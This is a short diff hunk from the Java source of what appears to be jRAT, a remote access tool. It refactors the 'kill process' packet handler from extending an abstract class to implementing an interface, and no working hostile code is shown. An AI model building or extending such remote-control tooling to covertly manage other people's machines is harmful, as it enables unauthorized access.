@@ -1,10 +1,10 @@
 package jrat.module.process;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 import oslib.OperatingSystem;
 
-public class Packet20KillProcess extends AbstractIncomingPacket {
+public class Packet20KillProcess implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
